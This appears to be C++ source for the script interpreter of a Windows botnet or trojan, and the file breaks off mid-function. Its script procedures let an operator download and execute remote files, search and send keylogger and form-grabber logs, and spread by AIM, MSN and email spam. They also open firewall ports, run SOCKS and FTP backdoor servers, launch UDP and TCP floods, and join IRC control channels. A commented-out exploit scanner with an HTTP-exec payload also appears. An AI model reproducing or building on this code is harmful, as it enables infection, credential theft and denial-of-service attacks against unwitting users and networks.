#include <winsock2.h>
#include "sel.h"
#include "payload_httpexec.h"

namespace SEL{

AimSpread* pAimSpread = NULL;
#ifndef NO_EMAIL_SPREAD
EmailSpread* pEmailSpread = NULL;
#endif
//ScanThread* pScanThread = NULL;
class Scripts Scripts;

class ProcedureMessageBox : public Procedure
{
public:
	ProcedureMessageBox() : Procedure("MessageBox", 2) {};
private:
	VOID Body(std::vector<Variable*>& Parameters){
		Parameters[0]->ToString();
		Parameters[1]->ToString();
		MessageBox(NULL, Parameters[1]->Data.String, Parameters[0]->Data.String, MB_OK);
	};
};

class ProcedureSleep : public Procedure
{
public:
	ProcedureSleep() : Procedure("Sleep", 1) {};
private:
	VOID Body(std::vector<Variable*>& Parameters){
		if(Parameters[0]->IsInteger()){
			Sleep(Parameters[0]->Data.Integer);
		}
	};
};

class ProcedureRand : public Procedure
{
public:
	ProcedureRand() : Procedure("Rand", 2) {};
private:
	VOID Body(std::vector<Variable*>& Parameters){
		if(Parameters[0]->IsInteger() && Parameters[1]->IsInteger()){
			Return->SetInteger(rand_r(Parameters[0]->Data.Integer, Parameters[1]->Data.Integer));
		}
	};
};

class ProcedureTCPTunnel : public Procedure
{
public:
	ProcedureTCPTunnel() : Procedure("TCPTunnel", 3) {};
private:
	VOID Body(std::vector<Variable*>& Parameters){
		if(Parameters[0]->IsInteger() && Parameters[1]->IsInteger() && Parameters[2]->IsString()){
			new TCPTunnel(Parameters[0]->Data.Integer, Parameters[1]->Data.Integer, Parameters[2]->Data.String);
		}
	};
};

class ProcedureGetIdleTime : public Procedure
{
public:
	ProcedureGetIdleTime() : Procedure("GetIdleTime", 0) {};
private:
	VOID Body(std::vector<Variable*>& Parameters){
		Return->SetInteger(IdleTrack.GetIdleTime());
	};
};

class ProcedureGetCountry : public Procedure
{
public:
	ProcedureGetCountry() : Procedure("GetCountry", 0) {};
private:
	VOID Body(std::vector<Variable*>& Parameters){
		CHAR Country[4];
		GetLocaleInfo(LOCALE_SYSTEM_DEFAULT, LOCALE_SABBREVCTRYNAME, Country, sizeof(Country)); 
		Return->SetString(Country);
	};
};

class ProcedureGetUUID : public Procedure
{
public:
	ProcedureGetUUID() : Procedure("GetUUID", 0) {};
private:
	VOID Body(std::vector<Variable*>& Parameters){
		Return->SetString(Config::GetUUIDAscii());
	};
};

class ProcedureGetUptime : public Procedure
{
public:
	ProcedureGetUptime() : Procedure("GetUptime", 0) {};
private:
	VOID Body(std::vector<Variable*>& Parameters){
		Return->SetInteger(Config::GetUptime());
	};
};

class ProcedureGetIP : public Procedure
{
public:
	ProcedureGetIP() : Procedure("GetIP", 0) {};
private:
	VOID Body(std::vector<Variable*>& Parameters){
		Return->SetInteger(Config::GetIPAddress());
	};
};

class ProcedureGetSubnetMask : public Procedure
{
public:
	ProcedureGetSubnetMask() : Procedure("GetSubnetMask", 0) {};
private:
	VOID Body(std::vector<Variable*>& Parameters){
		Return->SetInteger(Config::GetSubnetMask());
	};
};

class ProcedureGetVersion : public Procedure
{
public:
	ProcedureGetVersion() : Procedure("GetVersion", 0) {};
private:
	VOID Body(std::vector<Variable*>& Parameters){
		Return->SetInteger(atoi(EXE_VERSION));
	};
};

class ProcedureP2PGetPort : public Procedure
{
public:
	ProcedureP2PGetPort() : Procedure("GetPort", 0) {};
private:
	VOID Body(std::vector<Variable*>& Parameters){
		Return->SetInteger(Config::GetP2PPort());
	};
};

class ProcedureP2PGetMode : public Procedure
{
public:
	ProcedureP2PGetMode() : Procedure("GetMode", 0) {};
private:
	VOID Body(std::vector<Variable*>& Parameters){
		Return->SetInteger(P2P2Instance->GetMode());
	};
};

class ProcedureP2PGetLinkedIP : public Procedure
{
public:
	ProcedureP2PGetLinkedIP() : Procedure("GetLinkedIP", 0) {};
private:
	VOID Body(std::vector<Variable*>& Parameters){
		Return->SetInteger(P2P2Instance->GetLinkedIP());
	};
};

class ProcedureP2PCountClients : public Procedure
{
public:
	ProcedureP2PCountClients() : Procedure("Clients", 0) {};
private:
	VOID Body(std::vector<Variable*>& Parameters){
		Return->SetInteger(P2P2Instance->GetClientCount());
	};
};

class ProcedureP2PCountControls : public Procedure
{
public:
	ProcedureP2PCountControls() : Procedure("Controls", 0) {};
private:
	VOID Body(std::vector<Variable*>& Parameters){
		Return->SetInteger(P2P2Instance->GetControlCount());
	};
};

class ProcedureP2PCountLinks : public Procedure
{
public:
	ProcedureP2PCountLinks() : Procedure("Links", 0) {};
private:
	VOID Body(std::vector<Variable*>& Parameters){
		Return->SetInteger(P2P2Instance->GetLinkCount());
	};
};

class ProcedureLogsSend : public Procedure
{
public:
	ProcedureLogsSend() : Procedure("Send", 2) {};
private:
	VOID Body(std::vector<Variable*>& Parameters){
		if(Parameters[0]->IsString() && Parameters[1]->IsInteger()){
			new TransferLog(3, Parameters[0]->Data.String, Parameters[1]->Data.Integer);
		}
	};
};

class ProcedureLogsSearch : public Procedure
{
public:
	ProcedureLogsSearch() : Procedure("Search", 1) {};
private:
	VOID Body(std::vector<Variable*>& Parameters){
		if(Parameters[0]->IsString()){
			File KeyFile(Config::GetKeylogFilename());
			File FormFile(Config::GetFormlogFilename());
			if(KeyFile.Search((PBYTE)Parameters[0]->Data.String, strlen(Parameters[0]->Data.String)) || FormFile.Search((PBYTE)Parameters[0]->Data.String, strlen(Parameters[0]->Data.String))){
				Return->SetInteger(TRUE);
			}else{
				Return->SetInteger(FALSE);
			}
		}
	};
};

class ProcedureHTTPDownload : public Procedure
{
public:
	ProcedureHTTPDownload() : Procedure("Download", 2) {};
private:
	VOID Body(std::vector<Variable*>& Parameters){
		if(Parameters[0]->IsString() && Parameters[1]->IsString()){
			HTTP::Download(Parameters[0]->Data.String, Parameters[1]->Data.String, NULL);
		}
	};
};

class ProcedureHTTPExecute : public Procedure
{
public:
	ProcedureHTTPExecute() : Procedure("Execute", 1) {};
private:
	VOID Body(std::vector<Variable*>& Parameters){
		if(Parameters[0]->IsString()){
			HTTP::Download(Parameters[0]->Data.String, "TEMP", HTTP::Flags::Execute);
		}
	};
};

class ProcedureHTTPUpdate : public Procedure
{
public:
	ProcedureHTTPUpdate() : Procedure("Update", 1) {};
private:
	VOID Body(std::vector<Variable*>& Parameters){
		if(Parameters[0]->IsString()){
			HTTP::Download(Parameters[0]->Data.String, "TEMP", HTTP::Flags::Update);
		}
	};
};

class ProcedureHTTPVisit : public Procedure
{
public:
	ProcedureHTTPVisit() : Procedure("Visit", 2) {};
private:
	VOID Body(std::vector<Variable*>& Parameters){
		if(Parameters[0]->IsString()){
			HTTP::Visit(Parameters[0]->Data.String, Parameters[1]->Data.Integer ? 1 : 0);
		}
	};
};

class ProcedureHTTPPost : public Procedure
{
public:
	ProcedureHTTPPost() : Procedure("Post", 2) {};
private:
	VOID Body(std::vector<Variable*>& Parameters){
		if(Parameters[0]->IsString() && Parameters[1]->IsString()){
			HTTP::Post(Parameters[0]->Data.String, Parameters[1]->Data.String);
		}
	};
};

class ProcedureHTTPSpeedTest : public Procedure
{
public:
	ProcedureHTTPSpeedTest() : Procedure("SpeedTest", 1) {};
private:
	VOID Body(std::vector<Variable*>& Parameters){
		if(Parameters[0]->IsString()){
			Return->SetFloat(HTTP::SpeedTest(Parameters[0]->Data.String));
		}
	};
};

class ProcedureHTTPHostChildImage : public Procedure
{
public:
	ProcedureHTTPHostChildImage() : Procedure("HostChildImage", 1) {};
private:
	VOID Body(std::vector<Variable*>& Parameters){
		if(Parameters[0]->IsString()){
			new class HTTP::HostChildImage(Parameters[0]->Data.String);
		}
	};
};

class ProcedureIRCNotifyAll : public Procedure
{
public:
	ProcedureIRCNotifyAll() : Procedure("NotifyAll", 1) {};
private:
	VOID Body(std::vector<Variable*>& Parameters){
		Parameters[0]->ToString();
		IRCList.Notify(Parameters[0]->Data.String);
	};
};

class ProcedureIRCQuitAll : public Procedure
{
public:
	ProcedureIRCQuitAll() : Procedure("QuitAll", 1) {};
private:
	VOID Body(std::vector<Variable*>& Parameters){
		if(Parameters[0]->IsString()){
			IRCList.QuitAll(Parameters[0]->Data.String);
		}
	};
};

class ProcedureIRCNew : public Procedure
{
public:
	ProcedureIRCNew() : Procedure("New", 7) {};
private:
	VOID Body(std::vector<Variable*>& Parameters){
		if(Parameters[0]->IsString() && Parameters[1]->IsInteger() && Parameters[2]->IsString() && Parameters[3]->IsString() && Parameters[4]->IsString() && Parameters[5]->IsString() && Parameters[6]->IsString()){
			IRCList.Add(new IRC(Parameters[0]->Data.String, Parameters[1]->Data.Integer, Parameters[2]->Data.String, Parameters[3]->Data.String, Parameters[4]->Data.String, Parameters[5]->Data.String, Parameters[6]->Data.String));
		}
	};
};

class ProcedureAIMSpread : public Procedure
{
public:
	ProcedureAIMSpread() : Procedure("Spread", 1) {};
private:
	VOID Body(std::vector<Variable*>& Parameters){
		if(Parameters[0]->IsInteger()){
			if(!pAimSpread){
				pAimSpread = new AimSpread(Parameters[0]->Data.Integer);
			}else{
				pAimSpread->SetTimesToSend(Parameters[0]->Data.Integer);
				pAimSpread->Reset();
			}
		}
	};
};

class ProcedureAIMSendIM : public Procedure
{
public:
	ProcedureAIMSendIM() : Procedure("SendIM", 3) {};
private:
	VOID Body(std::vector<Variable*>& Parameters){
		if(Parameters[0]->IsString() && Parameters[1]->IsString() && Parameters[2]->IsInteger()){
			AIM::SendIM(Parameters[0]->Data.String, Parameters[1]->Data.String, Parameters[2]->Data.Integer);
		}
	};
};

class ProcedureAIMSpam : public Procedure
{
public:
	ProcedureAIMSpam() : Procedure("Spam", 2) {};
private:
	VOID Body(std::vector<Variable*>& Parameters){
		if(Parameters[0]->IsString() && Parameters[1]->IsInteger()){
			AIM::SpamBuddyList(Parameters[0]->Data.String, Parameters[1]->Data.Integer);
		}
	};
};

class ProcedureMSNSendIM : public Procedure
{
public:
	ProcedureMSNSendIM() : Procedure("SendIM", 3) {};
private:
	VOID Body(std::vector<Variable*>& Parameters){
		if(Parameters[0]->IsString() && Parameters[1]->IsString() && Parameters[2]->IsInteger()){
			MSM::SendIM(Parameters[0]->Data.String, Parameters[1]->Data.String, Parameters[2]->Data.Integer);
		}
	};
};

class ProcedureMSNSpam : public Procedure
{
public:
	ProcedureMSNSpam() : Procedure("Spam", 2) {};
private:
	VOID Body(std::vector<Variable*>& Parameters){
		if(Parameters[0]->IsString() && Parameters[1]->IsInteger()){
			MSM::SpamContacts(Parameters[0]->Data.String, Parameters[1]->Data.Integer);
		}
	};
};

#ifndef NO_EMAIL_SPREAD
class ProcedureEmailSpread : public Procedure
{
public:
	ProcedureEmailSpread() : Procedure("Spread", 1) {};
private:
	VOID Body(std::vector<Variable*>& Parameters){
		if(Parameters[0]->IsInteger()){
			if(!pEmailSpread)
				pEmailSpread = new EmailSpread(Parameters[0]->Data.Integer);
			else{
				pEmailSpread->SetTimesToSend(Parameters[0]->Data.Integer);
				pEmailSpread->Reset();
			}
		}
	};
};
#endif

#ifndef NO_FTP_SERVER
class ProcedureFTPServer : public Procedure
{
public:
	ProcedureFTPServer() : Procedure("Server", 4) {};
private:
	VOID Body(std::vector<Variable*>& Parameters){
		if(Parameters[0]->IsInteger() && Parameters[1]->IsString() && Parameters[2]->IsString()){
			UCHAR UserHash[16];
			UCHAR PassHash[16];
			MD5 MD5User;
			MD5User.Update((PUCHAR)Parameters[1]->Data.String, strlen(Parameters[1]->Data.String));
			MD5User.Finalize(UserHash);
			MD5 MD5Pass;
			MD5Pass.Update((PUCHAR)Parameters[2]->Data.String, strlen(Parameters[2]->Data.String));
			MD5Pass.Finalize(PassHash);

			if(Parameters[3]->Data.Integer)
				Config::EnableFTPStartup(Parameters[0]->Data.Integer, UserHash, PassHash);
			new FTPServer(Parameters[0]->Data.Integer, UserHash, PassHash);
		}
	};
};
#endif

class ProcedureSocksStart : public Procedure
{
public:
	ProcedureSocksStart() : Procedure("Start", 4) {};
private:
	VOID Body(std::vector<Variable*>& Parameters){
		if(Parameters[0]->IsInteger() && Parameters[1]->IsString() && Parameters[2]->IsString()){
			UCHAR UserHash[16];
			UCHAR PassHash[16];
			MD5 MD5User;
			MD5User.Update((PUCHAR)Parameters[1]->Data.String, strlen(Parameters[1]->Data.String));
			MD5User.Finalize(UserHash);
			MD5 MD5Pass;
			MD5Pass.Update((PUCHAR)Parameters[2]->Data.String, strlen(Parameters[2]->Data.String));
			MD5Pass.Finalize(PassHash);
			new ProxyServer(ALLOW_SOCKS_VER_4 | ALLOW_SOCKS_VER_5, Parameters[0]->Data.Integer, UserHash, PassHash);
			if(Parameters[3]->Data.Integer)
				Config::EnableSocksStartup(ALLOW_SOCKS_VER_4 | ALLOW_SOCKS_VER_5, Parameters[0]->Data.Integer, UserHash, PassHash);
		}
	};
};

class ProcedureFirewallOpenPort : public Procedure
{
public:
	ProcedureFirewallOpenPort() : Procedure("OpenPort", 1) {};
private:
	VOID Body(std::vector<Variable*>& Parameters){
		if(Parameters[0]->IsInteger()){
			FireWall FireWall;
			FireWall.OpenPort(Parameters[0]->Data.Integer, NET_FW_IP_PROTOCOL_TCP, L"null");
			FireWall.OpenPort(Parameters[0]->Data.Integer, NET_FW_IP_PROTOCOL_UDP, L"null");
		}
	};
};
/*
class ProcedureScanStart : public Procedure
{
public:
	ProcedureScanStart() : Procedure("Start", 1) {};
private:
	VOID Body(std::vector<Variable*>& Parameters){
		if(Parameters[0]->IsInteger()){
			if(!pScanThread)
				pScanThread = new ScanThread(Parameters[0]->Data.Integer);
			pScanThread->SetInterval(Parameters[0]->Data.Integer);
			pScanThread->Resume();
		}
	};
};

class ProcedureScanPause : public Procedure
{
public:
	ProcedureScanPause() : Procedure("Pause", 0) {};
private:
	VOID Body(std::vector<Variable*>& Parameters){
		if(pScanThread)
			pScanThread->Pause();
	};
};

class ProcedureScanSetPayload : public Procedure
{
public:
	ProcedureScanSetPayload() : Procedure("SetPayload", 2) {};
private:
	VOID Body(std::vector<Variable*>& Parameters){
		if(Parameters[0]->IsString() && Parameters[1]->IsString()){
			if(stricmp(Parameters[0]->Data.String, "HTTPEXEC") == 0){
				Exploits.SetPayload(new PayloadHTTPExec(Parameters[1]->Data.String));
			}else
			if(stricmp(Parameters[0]->Data.String, "NONE") == 0){
				Exploits.SetPayload(NULL);
			}
		}
	};
};

class ProcedureScanSetExploit : public Procedure
{
public:
	ProcedureScanSetExploit() : Procedure("SetExploit", 1) {};
private:
	VOID Body(std::vector<Variable*>& Parameters){
		if(Parameters[0]->IsString()){
			if(stricmp(Parameters[0]->Data.String, "NONE") == 0){
				Exploits.SetExploit(NULL);
			}else{
				Exploits.SetExploit(Parameters[0]->Data.String);
			}
		}
	};
};

class ProcedureScanTargetsAdd : public Procedure
{
public:
	ProcedureScanTargetsAdd() : Procedure("Add", 1) {};
private:
	VOID Body(std::vector<Variable*>& Parameters){
		if(Parameters[0]->IsString()){
			if(!pScanThread){
				pScanThread = new ScanThread(0);
				WaitForSingleObject(pScanThread->GetThreadHandle(), 5000);
				pScanThread->Pause();
			}
			pScanThread->AddTarget(Parameters[0]->Data.String);
		}
	};
};

class ProcedureScanTargetsClear : public Procedure
{
public:
	ProcedureScanTargetsClear() : Procedure("Clear", 0) {};
private:
	VOID Body(std::vector<Variable*>& Parameters){
		if(pScanThread)
			pScanThread->ClearTargets();
	};
};

class ProcedureScanTargetsCurrent : public Procedure
{
public:
	ProcedureScanTargetsCurrent() : Procedure("Current", 0) {};
private:
	VOID Body(std::vector<Variable*>& Parameters){
		if(pScanThread){
			CHAR Text[64];
			sprintf(Text, "%s:%d", inet_ntoa(SocketFunction::Stoin(pScanThread->GetCurrentAddr())), pScanThread->GetCurrentPort());
			Return->SetString(Text);
		}
	};
};
*/
class ProcedureScriptsAbortAll : public Procedure
{
public:
	ProcedureScriptsAbortAll() : Procedure("AbortAll", 0) {};
private:
	VOID Body(std::vector<Variable*>& Parameters){
		Scripts.AbortAll(Script);
	};
};

class ProcedureUDPFlood : public Procedure
{
public:
	ProcedureUDPFlood() : Procedure("Flood", 3) {};
private:
	VOID Body(std::vector<Variable*>& Parameters){
		if(Parameters[0]->IsString() && Parameters[1]->IsInteger() && Parameters[2]->IsInteger()){
			Socket Sock;
			Sock.Create(SOCK_DGRAM);
			UINT Size = Parameters[2]->Data.Integer;
			if(Size > 0xFFFF)
				Size = 0xFFFF;
			PCHAR Buffer = new CHAR[Size];
			for(UINT g = 0; g < Size; g++)
				Buffer[g] = rand_r(0, 0xFF);
			sockaddr_in SockAddr;
			Sock.FillAddrStruct(&SockAddr, Parameters[0]->Data.String, Parameters[1]->Data.Integer);
			INT S = Sock.SendTo(Buffer, Size, (sockaddr *)&SockAddr, Size);
			delete[] Buffer;
			Sock.Disconnect(CLOSE_BOTH_HDL);
		}
	};
};

class ProcedureTCPFlood : public Procedure
{
public:
	ProcedureTCPFlood() : Procedure("Flood", 2) {};
private:
	VOID Body(std::vector<Variable*>& Parameters){
		if(Parameters[0]->IsString() && Parameters[1]->IsInteger()){
			Socket Sock;
			Sock.Create(SOCK_STREAM);
			Sock.BlockingMode(NONBLOCKING);
			Sock.Connect(Parameters[0]->Data.String, Parameters[1]->Data.Integer);
			Sock.Disconnect(CLOSE_BOTH_HDL);
		}
	};
};

class ProcedurePVARSet : public Procedure
{
public:
	ProcedurePVARSet() : Procedure("Set", 2) {};
private:
	VOID Body(std::vector<Variable*>& Parameters){
		if(Parameters[0]->IsString()){
			Parameters[1]->ToString();
			cRegistry Reg(HKEY_CURRENT_USER, REG_PVARS);
			Reg.SetString(Parameters[0]->Data.String, Parameters[1]->Data.String);
		}
	};
};

class ProcedurePVARGet : public Procedure
{
public:
	ProcedurePVARGet() : Procedure("Get", 1) {};
private:
	VOID Body(std::vector<Variable*>& Parameters){
		if(Parameters[0]->IsString()){
			cRegistry Reg(HKEY_CURRENT_USER, REG_PVARS);
			Return->SetString(Reg.GetString(Parameters[0]->Data.String));
		}
	};
};

class ProcedurePVARIsSet : public Procedure
{
public:
	ProcedurePVARIsSet() : Procedure("IsSet", 1) {};
private:
	VOID Body(std::vector<Variable*>& Parameters){
		if(Parameters[0]->IsString()){
			cRegistry Reg(HKEY_CURRENT_USER, REG_PVARS);
			if(Reg.Exists(Parameters[0]->Data.String)){
				Return->SetInteger(1);
			}else{
				Return->SetInteger(0);
			}
		}
	};
};

class ProcedurePVARClear : public Procedure
{
public:
	ProcedurePVARClear() : Procedure("Clear", 1) {};
private:
	VOID Body(std::vector<Variable*>& Parameters){
		if(Parameters[0]->IsString()){
			cRegistry Reg(HKEY_CURRENT_USER, REG_PVARS);
			Reg.DeleteValue(Parameters[0]->Data.String);
		}
	};
};

Variable::Variable(UINT Type){
	Data.String = NULL;
	Variable::Type = Type;
	Constant = FALSE;
	Scope = 0;
}

Variable::~Variable(){
	if(IsString()){
		if(Data.String){
			delete[] Data.String;
			Data.String = NULL;
		}
	}
}

BOOL Variable::IsInteger(VOID){
	return Type == VAR_INTEGER;
}

BOOL Variable::IsFloat(VOID){
	return Type == VAR_FLOAT;
}

BOOL Variable::IsString(VOID){
	return Type == VAR_STRING;
}

BOOL Variable::IsNone(VOID){
	return Type == VAR_NONE;
}

VOID Variable::SetInteger(INT Value){
	Data.Integer = Value;
	Type = VAR_INTEGER;
}

VOID Variable::SetFloat(DOUBLE Value){
	Data.Float = Value;
	Type = VAR_FLOAT;
}

VOID Variable::SetString(PCHAR Value){
	AllocateString(strlen(Value) + 1);
	strcpy(Data.String, Value);
	Type = VAR_STRING;
}

VOID Variable::ToInteger(VOID){
	if(IsString()){
		SetInteger(atoi(Data.String));
	}else
	if(IsFloat()){
		SetInteger((INT)Data.Float);
	}else
	if(IsNone()){
		SetInteger(0);
	}
}

VOID Variable::ToFloat(VOID){
	if(IsString()){
		SetFloat(atof(Data.String));
	}else
	if(IsInteger()){
		SetFloat(Data.Integer);
	}else
	if(IsNone()){
		SetFloat(0);
	}
}

VOID Variable::ToString(VOID){
	if(IsFloat()){
		DOUBLE Float = Data.Float;
		Data.String = NULL;
		CHAR String[32];
		sprintf(String, "%g", Float);
		SetString(String);
	}else
	if(IsInteger()){
		INT64 Integer = Data.Integer;
		Data.String = NULL;
		CHAR String[32];
		itoa(Integer, String, 10);
		SetString(String);
	}else
	if(IsNone()){
		Data.String = NULL;
		SetString("(null)");
	}
}

VOID Variable::AllocateString(UINT Size){
	if(Data.String){
		delete[] Data.String;
	}
	Data.String = new CHAR[Size];
}

VOID Variable::ResizeString(UINT Size){
	PCHAR StringCopy = new CHAR[strlen(Data.String) + 1];
	strcpy(StringCopy, Data.String);
	AllocateString(Size);
	strncpy(Data.String, StringCopy, Size);
	delete[] StringCopy;
}

VOID Variable::ParseString(VOID){
	for(UINT i = 0 ; i < strlen(Data.String); i++){
		if(Data.String[i] == '\\' && strlen(Data.String) > i + 1){
			strcpy(Data.String + i, Data.String + i + 1);
			if(Data.String[i] == 'r')
				Data.String[i] = '\r';
			else
			if(Data.String[i] == 'n')
				Data.String[i] = '\n';
		}
	}
}

VOID Variable::Assign(SEL::Variable & Variable){
	//if(IsNone()){
		if(Variable.IsInteger()){
			SetInteger(Variable.Data.Integer);
		}else
		if(Variable.IsFloat()){
			SetFloat(Variable.Data.Float);
		}else
		if(Variable.IsString()){
			SetString(Variable.Data.String);
		}
	//}
	/*if(IsInteger()){
		if(Variable.IsInteger()){
			Data.Integer = Variable.Data.Integer;
		}else
		if(Variable.IsFloat()){
			Data.Integer = Variable.Data.Float;
		}else
		if(Variable.IsString()){
			Data.Integer = atoi(Variable.Data.String);
		}
	}else
	if(IsFloat()){
		if(Variable.IsInteger()){
			Data.Float = Variable.Data.Integer;
		}else
		if(Variable.IsFloat()){
			Data.Float = Variable.Data.Float;
		}else
		if(Variable.IsString()){
			Data.Float = atof(Variable.Data.String);
		}
	}else
	if(IsString()){
		if(Variable.IsInteger()){
			AllocateString(32);
			itoa(Variable.Data.Integer, Data.String, 10);
		}else
		if(Variable.IsFloat()){
			AllocateString(32);
			sprintf(Data.String, "%g", Variable.Data.Float);
		}else
		if(Variable.IsString()){
			AllocateString(strlen(Variable.Data.String) + 1);
			strcpy(Data.String, Variable.Data.String);
		}
	}*/
}

VOID Variable::Assign(UINT TokenType, PCHAR Lexeme){
	if(TokenType == TOKEN_INTEGER){
		SetInteger(atoi(Lexeme));
	}else
	if(TokenType == TOKEN_FLOAT){
		SetFloat(atof(Lexeme));
	}else
	if(TokenType == TOKEN_STRING){
		SetString(Lexeme);
	}
}

VOID Variable::Add(Variable & Variable){
	if(IsInteger()){
		if(Variable.IsInteger()){
			Data.Integer += Variable.Data.Integer;
		}else
		if(Variable.IsFloat()){
			SetFloat(Data.Integer + Variable.Data.Float);
		}else
		if(Variable.IsString()){
			ToString();
			ResizeString(strlen(Data.String) + strlen(Variable.Data.String) + 1);
			strcat(Data.String, Variable.Data.String);
		}
	}else
	if(IsFloat()){
		if(Variable.IsInteger()){
			Data.Float += Variable.Data.Integer;
		}else
		if(Variable.IsFloat()){
			Data.Float += Variable.Data.Float;
		}else
		if(Variable.IsString()){
			ToString();
			ResizeString(strlen(Data.String) + strlen(Variable.Data.String) + 1);
			strcat(Data.String, Variable.Data.String);
		}
	}else
	if(IsString()){
		if(Variable.IsInteger()){
			CHAR IntegerString[32];
			itoa(Variable.Data.Integer, IntegerString, 10);
			ResizeString(strlen(Data.String) + strlen(IntegerString) + 1);
			strcat(Data.String, IntegerString);
		}else
		if(Variable.IsFloat()){
			CHAR FloatString[32];
			sprintf(FloatString, "%g", Variable.Data.Float);
			ResizeString(strlen(Data.String) + strlen(FloatString) + 1);
			strcat(Data.String, FloatString);
		}else
		if(Variable.IsString()){
			ResizeString(strlen(Data.String) + strlen(Variable.Data.String) + 1);
			strcat(Data.String, Variable.Data.String);
		}
	}
}

VOID Variable::Subtract(Variable & Variable){
	if(IsInteger()){
		if(Variable.IsInteger()){
			Data.Integer -= Variable.Data.Integer;
		}else
		if(Variable.IsFloat()){
			SetFloat(Data.Integer - Variable.Data.Float);
		}else
		if(Variable.IsString()){
			Data.Integer -= atoi(Variable.Data.String);
		}
	}else
	if(IsFloat()){
		if(Variable.IsInteger()){
			Data.Float -= Variable.Data.Integer;
		}else
		if(Variable.IsFloat()){
			Data.Float -= Variable.Data.Float;
		}else
		if(Variable.IsString()){
			Data.Float -= atof(Variable.Data.String);
		}
	}else
	if(IsString()){
		if(Variable.IsInteger()){
			SetInteger(atoi(Data.String) - Variable.Data.Integer);
		}else
		if(Variable.IsFloat()){
			SetFloat(atof(Data.String) - Variable.Data.Float);
		}else
		if(Variable.IsString()){
			SetFloat(atof(Data.String) - atof(Variable.Data.String));
		}
	}
}

VOID Variable::Multiply(Variable & Variable){
	if(IsInteger()){
		if(Variable.IsInteger()){
			SetFloat(Data.Integer *= Variable.Data.Integer);
		}else
		if(Variable.IsFloat()){
			SetFloat(Data.Integer * Variable.Data.Float);
		}else
		if(Variable.IsString()){
			SetFloat(Data.Integer *= atof(Variable.Data.String));
		}
	}else
	if(IsFloat()){
		if(Variable.IsInteger()){
			Data.Float *= Variable.Data.Integer;
		}else
		if(Variable.IsFloat()){
			Data.Float *= Variable.Data.Float;
		}else
		if(Variable.IsString()){
			Data.Float *= atof(Variable.Data.String);
		}
	}else
	if(IsString()){
		if(Variable.IsInteger()){
			SetFloat(atof(Data.String) * Variable.Data.Integer);
		}else
		if(Variable.IsFloat()){
			SetFloat(atof(Data.String) * Variable.Data.Float);
		}else
		if(Variable.IsString()){
			SetFloat(atof(Data.String) * atof(Variable.Data.String));
		}
	}
}

VOID Variable::Divide(Variable & Variable){
	if(IsInteger()){
		if(Variable.IsInteger()){
			SetFloat((DOUBLE)Data.Integer / Variable.Data.Integer);
		}else
		if(Variable.IsFloat()){
			SetFloat((DOUBLE)Data.Integer / Variable.Data.Float);
		}else
		if(Variable.IsString()){
			SetFloat((DOUBLE)Data.Integer / atof(Variable.Data.String));
		}
	}else
	if(IsFloat()){
		if(Variable.IsInteger()){
			Data.Float /= Variable.Data.Integer;
		}else
		if(Variable.IsFloat()){
			Data.Float /= Variable.Data.Float;
		}else
		if(Variable.IsString()){
			Data.Float /= atof(Variable.Data.String);
		}
	}else
	if(IsString()){
		if(Variable.IsInteger()){
			SetFloat(atof(Data.String) / Variable.Data.Integer);
		}else
		if(Variable.IsFloat()){
			SetFloat(atof(Data.String) / Variable.Data.Float);
		}else
		if(Variable.IsString()){
			SetFloat(atof(Data.String) / atof(Variable.Data.String));
		}
	}
}

VOID Variable::Modulus(Variable & Variable){
	ToInteger();
	Variable.ToInteger();
	SetInteger(Data.Integer % Variable.Data.Integer);
}

VOID Variable::LeftShift(Variable & Variable){
	ToInteger();
	Variable.ToInteger();
	SetInteger(Data.Integer << Variable.Data.Integer);
}

VOID Variable::RightShift(Variable & Variable){
	ToInteger();
	Variable.ToInteger();
	SetInteger(Data.Integer >> Variable.Data.Integer);
}

VOID Variable::And(Variable & Variable){
	if(Data.Integer && Variable.Data.Integer){
		SetInteger(1);
	}else{
		SetInteger(0);
	}
}

VOID Variable::Or(Variable & Variable){
	if(Data.Integer || Variable.Data.Integer){
		SetInteger(1);
	}else{
		SetInteger(0);
	}
}

VOID Variable::Not(VOID){
	if(Data.Integer){
		SetInteger(0);
	}else{
		SetInteger(1);
	}
}

VOID Variable::Negative(VOID){
	if(IsInteger()){
		SetInteger(-Data.Integer);
	}else
	if(IsFloat()){
		SetFloat(-Data.Float);
	}else
	if(IsString()){
		SetFloat(-(atof(Data.String)));
	}
}

VOID Variable::BitNot(VOID){
	if(Data.Integer){
		SetInteger(~Data.Integer);
	}
}

VOID Variable::Equals(Variable & Variable){
	if(IsInteger()){
		if(Variable.IsInteger()){
			SetInteger(Data.Integer == Variable.Data.Integer);
		}else
		if(Variable.IsFloat()){
			SetInteger(Data.Integer == (INT)Variable.Data.Float);
		}else
		if(Variable.IsString()){
			SetInteger(Data.Integer == atoi(Variable.Data.String));
		}
	}else
	if(IsFloat()){
		if(Variable.IsInteger()){
			SetInteger((INT)Data.Float == Variable.Data.Integer);
		}else
		if(Variable.IsFloat()){
			SetInteger((INT)Data.Float == (INT)Variable.Data.Float);
		}else
		if(Variable.IsString()){
			SetInteger((INT)Data.Float == atoi(Variable.Data.String));
		}
	}else
	if(IsString()){
		if(Variable.IsInteger()){
			SetInteger(atoi(Data.String) == Variable.Data.Integer);
		}else
		if(Variable.IsFloat()){
			SetInteger(atoi(Data.String) == (INT)Variable.Data.Float);
		}else
		if(Variable.IsString()){
			SetInteger(strcmp(Data.String, Variable.Data.String) == 0 ? 1 : 0);
		}
	}
}

VOID Variable::GreaterThan(Variable & Variable){
	if(IsInteger()){
		if(Variable.IsInteger()){
			SetInteger(Data.Integer > Variable.Data.Integer);
		}else
		if(Variable.IsFloat()){
			SetInteger(Data.Integer > Variable.Data.Float);
		}else
		if(Variable.IsString()){
			SetInteger(Data.Integer > atof(Variable.Data.String));
		}
	}else
	if(IsFloat()){
		if(Variable.IsInteger()){
			SetInteger(Data.Float > Variable.Data.Integer);
		}else
		if(Variable.IsFloat()){
			SetInteger(Data.Float > Variable.Data.Float);
		}else
		if(Variable.IsString()){
			SetInteger(Data.Float > atof(Variable.Data.String));
		}
	}else
	if(IsString()){
		if(Variable.IsInteger()){
			SetInteger(atof(Data.String) > Variable.Data.Integer);
		}else
		if(Variable.IsFloat()){
			SetInteger(atof(Data.String) > Variable.Data.Float);
		}else
		if(Variable.IsString()){
			SetInteger(strcmp(Data.String, Variable.Data.String) > 0 ? 1 : 0);
		}
	}
}

VOID Variable::LessThan(Variable & Variable){
	if(IsInteger()){
		if(Variable.IsInteger()){
			SetInteger(Data.Integer < Variable.Data.Integer);
		}else
		if(Variable.IsFloat()){
			SetInteger(Data.Integer < Variable.Data.Float);
		}else
		if(Variable.IsString()){
